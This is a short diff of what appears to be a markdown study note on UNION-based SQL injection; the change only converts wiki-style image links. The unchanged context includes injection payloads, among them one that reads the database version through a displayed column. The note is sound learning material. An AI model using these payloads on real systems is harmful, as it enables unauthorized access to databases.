@@ -28,10 +28,10 @@ cn' UNION select 1,2,3,4-- -
 * While a query may return multiple columns, the web application may only display some of them
 * This is why we need to determine which columns are printed to the page, to determine where to place our injection
 
-![[../../Screenshots/ports_columns_correct.png]]
+![](../../Screenshots/ports_columns_correct.png)
 
 ```sql
 cn' UNION select 1,@@version,3,4-- -
 ```
 
-![[../../Screenshots/db_version_1.jpg]]
+![](../../Screenshots/db_version_1.jpg)
